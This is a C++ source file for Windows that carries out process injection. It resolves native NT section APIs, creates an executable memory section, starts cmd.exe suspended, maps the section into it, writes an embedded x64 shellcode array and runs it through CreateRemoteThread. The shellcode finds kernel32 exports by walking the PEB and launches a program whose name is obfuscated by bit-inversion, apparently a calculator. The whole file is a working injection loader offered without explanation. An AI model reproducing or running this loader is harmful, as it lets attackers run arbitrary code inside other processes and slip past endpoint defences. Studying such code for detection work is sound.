#include <Windows.h>
#include <ntstatus.h>
#include <iostream>

#pragma comment(lib, "ntdll")

const UCHAR pload[] = {
	"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48"
	"\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8"
	"\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1"
	"\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d"
	"\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44"
	"\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2"
	"\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48"
	"\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04"
	"\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07"
	"\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8"
	"\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7"
	"\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50"
	"\x48\x89\xe1\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6"
};

typedef struct _LSA_UNICODE_STRING {
	USHORT            Length;
	USHORT            MaximumLength;
	PWSTR             Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG            Length;
	HANDLE           RootDirectory;
	PUNICODE_STRING  ObjectName;
	ULONG            Attributes;
	PVOID            SecurityDescriptor;
	PVOID            SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* pNtCreateSection)(
	OUT PHANDLE            SectionHandle,
	IN ULONG               DesiredAccess,
	IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER      MaximumSize OPTIONAL,
	IN ULONG               PageAttributess,
	IN ULONG               SectionAttributes,
	IN HANDLE              FileHandle OPTIONAL
	);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
	HANDLE            SectionHandle,
	HANDLE            ProcessHandle,
	PVOID*            BaseAddress,
	ULONG_PTR         ZeroBits,
	SIZE_T            CommitSize,
	PLARGE_INTEGER    SectionOffset,
	PSIZE_T           ViewSize,
	DWORD             InheritDisposition,
	ULONG             AllocationType,
	ULONG             Win32Protect
	);

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

int main()
{
    // Dynamically get native APIs
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    HANDLE hNewSection = NULL;
    LARGE_INTEGER sectionsize;
    sectionsize.QuadPart = 4096;

    NTSTATUS status = NtCreateSection(&hNewSection,
        SECTION_ALL_ACCESS,
        NULL,
        &sectionsize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);
    if (status != STATUS_SUCCESS) {
        printf("NtCreateSection failed: 0x%X\n", status);
        return 1;
    }

    // Spawn new process
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);
    wchar_t commandLine[] = L"cmd.exe";

    BOOL Ret = CreateProcess(NULL, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!Ret) {
        printf("CreateProcess failed: %d\n", GetLastError());
        return 1;
    }

    PVOID baseAddress = NULL;
    SIZE_T viewSize = 4096;

    NTSTATUS MapSection = NtMapViewOfSection(hNewSection,
        pi.hProcess,
        &baseAddress,
        0,
        0,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_EXECUTE_READWRITE);

    if (MapSection != STATUS_SUCCESS) {
        printf("NtMapViewOfSection failed: 0x%X\n", MapSection);
        printf("Last error: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }


    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, baseAddress, pload, sizeof(pload), &bytesWritten)) {
        printf("WriteProcessMemory failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hNewSection);

    return 0;
}
